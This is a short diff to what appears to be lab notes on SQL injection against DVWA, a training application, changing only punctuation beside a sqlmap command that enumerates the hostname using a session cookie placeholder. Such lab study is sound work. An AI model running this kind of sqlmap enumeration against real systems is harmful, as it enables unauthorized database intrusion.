@@ -9,7 +9,7 @@ Search Tag: #sql-injection #sqlmap #enumeration-and-discovery #dvwa
 
 ## 4.2 - General
 
-- Enumerate hostname
+- Enumerate hostname.
 
 ```
 $ sqlmap "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --hostname
